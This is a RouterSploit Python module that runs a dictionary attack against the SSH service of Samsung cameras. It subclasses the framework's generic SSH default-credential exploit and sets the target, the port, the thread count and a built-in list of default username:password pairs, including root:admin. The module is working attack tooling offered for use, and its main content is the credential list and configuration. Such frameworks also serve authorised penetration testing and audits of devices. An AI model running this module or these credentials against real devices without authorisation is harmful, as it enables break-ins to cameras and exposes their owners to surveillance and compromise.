from routersploit.core.exploit import *
from routersploit.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    __info__ = {
        "name": "Samsung Camera Default SSH Creds",
        "description": "Module perfroms dictionary attack against Samsung Camera SSH service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "Samsung Camera",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:1111111,admin:4321,root:admin", "User:Pass or file with default credentials (file://)")
